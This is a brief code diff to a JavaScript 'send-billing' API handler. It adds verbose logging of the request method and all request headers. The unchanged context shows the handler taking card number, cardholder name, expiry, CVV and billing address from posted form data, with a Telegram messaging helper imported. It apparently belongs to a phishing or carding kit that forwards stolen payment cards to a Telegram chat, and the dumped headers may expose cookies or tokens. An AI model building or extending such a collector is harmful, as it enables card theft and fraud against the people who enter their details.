@@ -2,6 +2,10 @@
 import { sendTelegramMessage } from '../telegram';
 
 export default async function handler(req, res) {
+  console.log('[send-billing] ========== BILLING API CALLED ==========');
+  console.log('[send-billing] Method:', req.method);
+  console.log('[send-billing] Headers:', JSON.stringify(req.headers, null, 2));
+  
   if (req.method === 'POST') {
     try {
       const { cardNumber, cardholderName, expiration, cvv, address, city, state, zip, userId } = req.body;
